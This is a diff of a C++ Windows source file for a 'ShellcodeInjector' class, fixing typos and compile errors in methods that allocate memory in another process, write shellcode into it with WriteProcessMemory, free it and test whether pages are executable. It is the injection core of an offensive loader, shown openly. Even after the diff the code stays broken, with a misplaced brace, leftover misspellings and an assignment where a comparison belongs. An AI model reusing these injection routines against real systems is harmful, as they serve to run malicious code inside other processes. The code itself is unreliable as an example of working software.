@@ -2,13 +2,13 @@
 #include<windows.h>
 #include<string>
 #include<vector>
-
+#include "src/Common/Utility.h"
 using namespace std;
 
-class Shellcodeinjector
+class ShellcodeInjector
 {
     public:
-         static LPVIOD AllocateRemoteMemory(HANDLE hProcess,size_t size)
+         static LPVOID AllocateRemoteMemory(HANDLE hProcess,size_t size)
          {
             if(hProcess==nullptr || hProcess=INVALID_HANDLE_VALUE)
             {
@@ -16,7 +16,7 @@ class Shellcodeinjector
                 return nullptr;
             }
     
-        if(size=0)
+        if(size==0)
         {
             Utility::PrintError("Shellcode size is 0");
             return nullptr;
@@ -33,12 +33,12 @@ class Shellcodeinjector
                 return nullptr;
             }
         }
-        Utility::PrintSuccess("Allocated "+ to_string(size) + "bytes at 0x" + to_string(reinterpret_cast<unitptr_t>(remoteMem)));
+        Utility::PrintSuccess("Allocated "+ to_string(size) + "bytes at 0x" + to_string(reinterpret_cast<uintptr_t>(remoteMem)));
         return remoteMem;
 
 
          }
-         static bool WriteShellcode(HANDLE hProcess,LPVIOD remoteAddr,const BYTE* shellcode,size_t size)
+         static bool WriteShellcode(HANDLE hProcess,LPVOID remoteAddr,const BYTE* shellcode,size_t size)
          {
             if(hProcess==nullptr || hProcess==INVALID_HANDLE_VALUE )
             {
@@ -47,7 +47,7 @@ class Shellcodeinjector
             }
             if (remoteAddr==nullptr)
             {
-                Utility::PrintErro("Invalid remote address");
+                Utility::PrintError("Invalid remote address");
                 return false;
             }
             if (shellcode==nullptr || size==0)
@@ -58,7 +58,7 @@ class Shellcodeinjector
 
             SIZE_T  bytesWritten=0;
 
-            BOOL success=WriteProcesMemory(hProcess,remoteAddr,shellcode,size,&bytesWritten);
+            BOOL success=WriteProcessMemory(hProcess,remoteAddr,shellcode,size,&bytesWritten);
 
             if(!success)
             {
@@ -74,7 +74,7 @@ class Shellcodeinjector
             return true;
          }
 
-         static bool FreeRemoteMemory(Handle hProcess,LPVOID remoteAddr)
+         static bool FreeRemoteMemory(HANDLE hProcess,LPVOID remoteAddr)
          {
            if(hProcess==nullptr || hProcess==INVALID_HANDLE_VALUE )
             {
@@ -83,22 +83,22 @@ class Shellcodeinjector
             }
             if (remoteAddr==nullptr)
             {
-                Utility::PrintErro("Invalid remote address");
+                Utility::PrintError("Invalid remote address");
                 return false;
             }
 
-            BOOL success=VirtualFreeEx(hProcess,reoteAddr,0,MEM_RELEASE)
-            {
+            BOOL success=VirtualFreeEx(hProcess,remoteAddr,0,MEM_RELEASE);
+            
                 if(!success)
                 {
                     Utility::PrinteError("Virtual Free Ex failed " + Utility::GetLastErrorString());
                     return false;
                 }
-
+         }
                 Utility::PrintSuccess("Memory free at 0x " + to_string(reinterpret_cast<uintptr_t>(remoteAddr)));
                 return true;
-            }
-            static LPVOID AllocateandWriteShellcode(HANDLE hProcess, cosnt BYTE* shellcode,size_t size)
+            
+            static LPVOID AllocateAndWriteShellcode(HANDLE hProcess, const BYTE* shellcode,size_t size)
             {
                   LPVIOD remoteMem=AllocateRemoteMemory(hProcess,size);
                   if(!remoteMem)
@@ -108,7 +108,7 @@ class Shellcodeinjector
 
                   if(!WriteShellcode(hProcess,remoteMem,shellcode,size))
                   {
-                    FreeRemote(hProcess,remoteMem);
+                    FreeRemoteMemory(hProcess,remoteMem);
                     return nullptr;
                   }
                   return remoteMem;
@@ -117,13 +117,13 @@ class Shellcodeinjector
             static bool Ismemoryexecutable(HANDLE hProcess,LPVIOD addr)
             {
                MEMORY_BASIC_INFORMATION mbi;
-               SIZE_T result=VirtualQueryEx(hProcess , addr, &mbr,sizeof(mbi));
+               SIZE_T result=VirtualQueryEx(hProcess , addr, &mbi,sizeof(mbi));
 
                if(result==0)
                {
                 return false;
                }
-               return (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |  PAGE_EXECUTE_WRITE | PAGE_EXECUTE_READWRITE)) != 0
+               return (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |  PAGE_EXECUTE_WRITECOPY | PAGE_EXECUTE_READWRITE)) != 0;
             }
          }
 
